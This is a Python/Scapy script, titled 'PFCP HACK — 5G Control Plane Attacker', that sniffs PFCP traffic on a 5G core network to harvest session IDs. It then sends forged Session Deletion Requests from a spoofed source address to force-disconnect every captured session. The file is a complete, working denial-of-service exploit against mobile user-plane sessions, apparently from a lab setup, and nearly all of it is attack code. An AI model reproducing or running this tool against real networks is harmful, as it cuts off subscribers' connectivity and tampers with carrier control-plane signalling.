from scapy.all import *
from scapy.contrib.pfcp import *

class color:
   PURPLE = "\033[95m"
   CYAN = "\033[96m"
   DARKCYAN = "\033[36m"
   BLUE = "\033[94m"
   GREEN = "\033[92m"
   YELLOW = "\033[93m"
   RED = "\033[91m"
   BOLD = "\033[1m"
   UNDERLINE = "\033[4m"
   END = "\033[0m"

SEID = []
SEQ = 0

def sniff_packets():
  sniff(filter="ip src host 10.4.2.122 and port 8805", iface='eth1', prn=process_packet)

def process_packet(packet):
  global SEID
  global SEQ
  if packet[PFCP].message_type == 51:
    print("New SEID is detected:  " + str(packet[PFCP]["IE F-SEID"].seid))
    SEID.append(packet[PFCP]["IE F-SEID"].seid)
    SEQ = packet[PFCP].seq
  elif packet[PFCP].message_type == 2:
    SEQ = packet[PFCP].seq


print(color.PURPLE + "\n  ██████╗ ███████╗ ██████╗██████╗   ██╗  ██╗ █████╗  ██████╗██╗  ██╗ "  + color.END)
print(color.CYAN +     "  ██╔══██╗██╔════╝██╔════╝██╔══██╗  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝ "  + color.END)
print(color.DARKCYAN + "  ██████╔╝█████╗  ██║     ██████╔╝  ███████║███████║██║     █████╔╝  "  + color.END)
print(color.BLUE +     "  ██╔═══╝ ██╔══╝  ██║     ██╔═══╝   ██╔══██║██╔══██║██║     ██╔═██╗  "  + color.END)
print(color.GREEN +    "  ██║     ██║     ╚██████╗██║       ██║  ██║██║  ██║╚██████╗██║  ██╗ "  + color.END)
print(color.YELLOW +   "  ╚═╝     ╚═╝      ╚═════╝╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ "  + color.END)
print(color.YELLOW + "\n                  5G Control Plane Attacker                      "  + color.END)


print(color.BOLD + color.GREEN + "\n\nStart collecting SEID..... Press [Ctrl + C] to Stop." + color.END)

if __name__ == "__main__":
  sniff_packets()
  print(color.BOLD + color.GREEN + "\n\nStop collecting SEID." + color.END)
  print("List of detected SEID:  " + str(SEID))
  stop = input(color.BOLD + color.RED + "\n\nDo you want to force disconnect these SEID? [Y/n]  " + color.END) or "Y"
  if stop == 'Y' or stop == 'y':
    ip = IP()
    udp = UDP()
    pfcp = PFCP()
    ip.src = '10.4.3.123'
    ip.dst = '10.4.2.122'
    udp.sport = 8805
    udp.dport = 8805
    pfcp.message_type = 54
    
    for i in SEID:
      SEQ = SEQ + 100
      pfcp.seid = i
      pfcp.seq = SEQ
      packet = ip/udp/pfcp
      print(packet[PFCP].show())
      send(packet)

    print("")
    print("")
    print(color.RED + "                █████████               " + color.END)
    print(color.RED + "              █████████████             " + color.END)
    print(color.RED + "             ███████████████            " + color.END)
    print(color.RED + "           ██████████████████           " + color.END)
    print(color.RED + "           ███████████████████          " + color.END)
    print(color.RED + "          ████████████████████          " + color.END)
    print(color.RED + "    █     █████████████████████    █    " + color.END)
    print(color.RED + "   ████   █████████████████████  ████   " + color.END)
    print(color.RED + "   █████  █████████████████████  ████   " + color.END)
    print(color.RED + "  ██████  █████████████████████ ██████  " + color.END)
    print(color.RED + " ████████ ██ ███████████████ ██ ███████ " + color.END)
    print(color.RED + " ████████ █ ████████████████ ██ ███████ " + color.END)
    print(color.RED + "  ███████ █ ████████████████ █ ███████  " + color.END)
    print(color.RED + "   ██████ █ █    ██████    ██  ███████  " + color.END)
    print(color.RED + "        █ ██      ████      ████        " + color.END)
    print(color.RED + "           █       ███      ██          " + color.END)
    print(color.RED + "          ██      ████      ██          " + color.END)
    print(color.RED + "          ██      █████     ███         " + color.END)
    print(color.RED + "          ███   ███   ██    ██          " + color.END)
    print(color.RED + "          ████████  █ ████████          " + color.END)
    print(color.RED + "           ███████  █ ███████           " + color.END)
    print(color.RED + "               ███  █ ███               " + color.END)
    print(color.RED + "            ██  █████████ ██            " + color.END)
    print(color.RED + "          ██ █  █████████ ██ █          " + color.END)
    print(color.RED + "      ██████ ██   █████   ██ ██████     " + color.END)
    print(color.RED + "  ██████████ ███ ██   ████████████████  " + color.END)
    print(color.RED + "  ██████████ ███   ██   ███  ██████████ " + color.END)
    print(color.RED + "  ████████    ███ █ █ █████   ████████  " + color.END)
    print(color.RED + "   ██████     █████  █████     ██████   " + color.END)
    print(color.RED + "   █████       ███████████      █████   " + color.END)
    print(color.RED + "    ███         █████████        ████   " + color.END)
    print(color.RED + "                 ██████                 " + color.END)
    print("")
    print("")
    print("")
    input(color.CYAN + "\n\n!!!!! DONE. Hit enter to quit !!!!" + color.END)